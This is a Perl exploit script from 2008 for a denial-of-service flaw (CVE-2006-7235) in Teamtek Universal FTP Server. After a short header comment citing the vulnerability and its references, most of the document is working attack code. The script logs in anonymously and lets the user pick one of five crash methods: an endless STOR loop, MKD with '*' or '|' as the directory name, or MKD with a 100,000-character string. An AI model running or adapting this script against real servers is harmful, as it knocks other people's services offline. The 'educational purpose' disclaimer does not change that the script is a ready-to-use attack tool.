#!/usr/bin/perl -w

##########################################################################################################
    ######################Develop Telangana! or Give
    Telangana!!!#############################################
    ################################INDIA is
    Great############################################################

##########################################################################################################
    #
    # Teamtek Universal FTP Server 1.0.50 allows remote attackers to
    cause a denial of service (daemon crash or hang) via (1)
    # multiple STOR (aka PUT) commands, or an MKD command followed by
    (2) a '*' argument, (3) a '|' argument,
    # (4) spaces, or (5) a long string. NOTE: the provenance of this
    information is unknown; the details are obtained solely
    # from third party information.
    #
    # References:
    #    http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2006-7235
    #    http://www.securityfocus.com/bid/21085
    #
    # Tested on Windows XP SP1 with
    # Universal FTP Server 1.0.44
    # Banner: UNIVERSAL FTP SERVER - by Daniele Pratelli -
    www.teamtek.net <http://www.teamtek.net/> - www.5e5.net
    <http://www.5e5.net/>
    # With "mkdir |" command application crashes with "Run-time error
    '52:' Bad file name or number"
    # With "mkdir *" command application crashes with "Run-time error
    '76:' Path not found"
    #
    # To run this exploit on MS Windows replace "#!usr/bin/perl -w"
    with "#!Installation_path_for_perl -w"
    #     (say #!C:/Perl/bin/perl -w)
    #
    # This was strictly written for educational purpose. Use it at
    your own risk.
    # Author will not bare any responsibility for any damages watsoever.
    #
    #  Author: Praveen Darhanam
    #  Email: praveen[underscore]recker[at]sify.com <http://sify.com/>
    #  Blog: http://darshanams.blogspot.com
    <http://darshanams.blogspot.com/>
    #  Date: 20th December, 2008
    #

########################################################################################
    use Net::FTP;

    $ftp_dos_mkd=Net::FTP->new("$ARGV[0]",Debug=>0) || die "Cannot
    connect to Host $ARGV[0]\n Usage: ]#perl script_name

    vuln_target_ip r Host\n";
    $ftp_dos_mkd -> login("anonymous","anonymous") || die "Could not
    Login...Retry";

    print "Enter 1 to launch FTP DoS using using multiple STOR/PUT
    commands\n";
    print "Enter 2 to launch FTP DoS using directory name as * with
    MKD command\n";
    print "Enter 3 to launch FTP DoS using directory name as | with
    MKD command\n";
    print "Enter 4 to launch FTP DoS using MKD command followed by
    spaces\n";
    print "Enter 5 to launch FTP DoS using MKD command followed by
    long string\n";

    $special_char=<STDIN>;
    chomp($special_char);

    if($special_char==1)
    {
     while(1)
     {
      $ftp_dos_mkd -> stor("abc.txt");
     }
    }
    elsif($special_char==2)
    {
     $ftp_dos_mkd -> mkdir("*");
    }
    elsif($special_char==3)
    {
     $ftp_dos_mkd -> mkdir("|");
    }
    elsif($special_char==4)
    {
     my $buf1 = "\x20" x 100000;
     $ftp_dos_mkd -> mkdir("$buf1");
    }
    elsif($special_char==5)
    {
     my $buf2 = "D" x 100000;
     $ftp_dos_mkd -> mkdir("$buf2");
    }
    else
    {
     printf "Please enter correct number to launch exploit !!";
    }

    $ftp_dos_mkd->quit;
